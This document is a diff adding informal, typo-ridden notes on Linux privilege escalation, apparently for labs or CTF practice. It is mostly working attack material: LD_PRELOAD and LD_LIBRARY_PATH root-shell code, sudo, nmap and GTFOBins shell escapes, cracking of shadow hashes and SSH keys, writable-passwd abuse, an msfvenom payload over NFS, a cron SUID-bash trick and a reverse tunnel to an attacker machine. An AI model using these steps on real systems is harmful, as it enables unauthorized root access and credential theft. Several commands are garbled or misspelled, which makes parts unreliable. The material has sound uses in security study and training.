@@ -1,0 +1,160 @@
+Privelages esclation -Linux
+
+Gain shell as root user
+Permission {User Groups Other}
+user acc {/etc/passwd} user password hash{/etc/shadow}, groups {/etc/group}
+root (uid=0),
+ SUID(setuid)=> when this is set file get executed with priv of owner 
+ SGID(setgid)=> when this is set file gget executed with priv of file group
+ 
+ ls -al {start with '-' for file 'd' for directory} {owner group other rwxs}
+ 
+ Tool LinEnum, len.sh(https://github.com/diego-treitos/linux-smart-enumeration
+ 
+ A. Kernal level exploit(try always last)
+ {
+ uname -a | find exploit on google, exploit db
+ {searchsploit linux lernal x.x.xx priv esc}
+ 
+ use tool => linux_exploit suggester.pl -k kernal_ver
+ }
+ B. Service running as root
+ {
+  find process ruunning as root
+     ps aux| grep "^root"
+	  
+ }
+ 
+ C. Port forwarding
+ {
+ in remote m/c
+ ssh -R 4444:127.0.0.1:3306 root@attackermc
+ }
+D. crask /etc/shadow hash 
+{
+john -wodlist hash.txt
+}
+
+E.  Writitng /etc/shadow || /etc/passwd if writable
+{
+a. mkpassword -m sha-512 vinod =>modify shadiw entry with new password in shadow
+b. openssl passwrd "vinod" => modify /passwd/ file
+c. copy root line and create new user with same line
+root:2TGtaGPxVO2Ds:0:0:root:/root:/bin/bash => newroot:2TGtaGPxVO2Ds:0:0:root:/root:/bin/bash
+}
+
+F. Exploiting SSH key
+{
+check ssh key => .ssh
+check if root ssh allow => grep PermitRootLogin
+cat /.ssh/xx_key
+
+chmod 600 id_rsa user@ip
+if ask for passswd crack via john
+/usr/share/john$:ssh2jhon.py id_rsa>key
+john --wordlist=/usr/share/wordlist/rockyou.txt key --format SSH key
+}
+
+
+E. exploiting via nmap
+{
+nmap -V
+nmap --interactive
+!sh
+whoami
+OR
+echo "os.execute('/bin/sh')" > /tmp/shell.nse 
+$ sudo nmap --script=/tmp/shell.nse
+}
+
+G. Exploitng Sudo
+{
+sudo escape seq => https://gtfobins.github.io/ find commadna dn sudo seq
+sudo su
+sudo -s
+sudo /bin/bash
+sudo passwd
+
+sudo -l
+sudo apache2 -f file 
+}
+H.  env_keep
+{
+if env_keep=+LD_preload use follwing code
+[[#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setresuid(0,0,0);
+system("/bin/bash -p");
+}
+]
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+sudo LD_PRELOAD=/tmp/preload.so apache2
+}
+
+I. LDD
+{
+1. ldd program
+[
+#include <stdio.h>
+#include <stdlib.h>
+static void hijack() __attribute__((constructor));
+void hijack() {
+unsetenv("LD_LIBRARY_PATH");
+setresuid(0,0,0);
+system("/bin/bash -p");
+}]
+gcc -o libcrypt.so.1 -shared -fPIC library_path.c
+sudo LD_LIBRARY_PATH=. apache2
+
+}
+
+
+
+J NFS 
+{
+check /etc/exports
+export list =>  showmount -e ip || nmap -sV --script=nfs-showmount ip 
+check for no_root-squash(allow write fiel as root)
+mount NFS mount -o rw, vers=2 ip:share local_dir {sudo mount -o  rw,vers=2 192.168.135.132:/tmp /tmp/nfs}
+exploit = msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf 
+chmod +x shell.elf
+}
+
+K CRON JOBS
+
+{
+1. cat /etc/crontabs | cronob via user sudo crontab –u username –l 
+try to change corn job
+
+2. check if we can chanhe path variable create cronjob [if cron job run] file 
+ [
+ #!/bin/bash
+ cp /bin/bash /tmp/rootbash
+ chmod +s /tmp/rootbash
+ ] wait for crom job to run
+
+}
+
+
+L SUID/SGID
+{finding filw with SUID and SGID bit set
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
+2> /dev/null
+
+}
+Other Command
+{
+1. sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
+2. sudo tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash
+3. sudo strace -o/dev/null /bin/bash
+4. sudo scp -S /path/yourscript x y
+5. sudo except spawn sh then sh
+6. sudo nano -S /bin/bash
+7. sudo ftp > !/bin/sh
+8. sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
+}
+
+
